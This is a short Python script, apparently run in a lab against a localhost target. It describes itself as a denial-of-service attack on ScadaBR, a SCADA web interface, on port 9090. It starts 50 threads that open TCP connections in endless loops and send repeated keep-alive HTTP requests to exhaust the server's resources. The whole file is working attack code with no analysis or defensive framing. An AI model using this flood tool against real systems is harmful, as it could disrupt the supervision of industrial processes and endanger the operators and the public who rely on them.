import socket
import threading
import time

SCADA_IP = "127.0.0.1"
SCADA_PORT = 9090

# HTTP request sent repeatedly to ScadaBR
REQUEST = b"GET /ScadaBR/ HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\n\r\n"

def flood():
    while True:
        try:
            # Create TCP socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)

            # Connect to ScadaBR web server
            s.connect((SCADA_IP, SCADA_PORT))

            # Send multiple HTTP requests over the same connection
            for _ in range(50):
                s.sendall(REQUEST)

            # Keep the connection open briefly to consume server resources
            time.sleep(0.2)
            s.close()
        except:
            pass

print("[+] Starting DoS attack against ScadaBR (port 9090)")

# Launch multiple concurrent threads
for _ in range(50):
    t = threading.Thread(target=flood, daemon=True)
    t.start()

# Keep main thread alive without high CPU usage
while True:
    time.sleep(1)
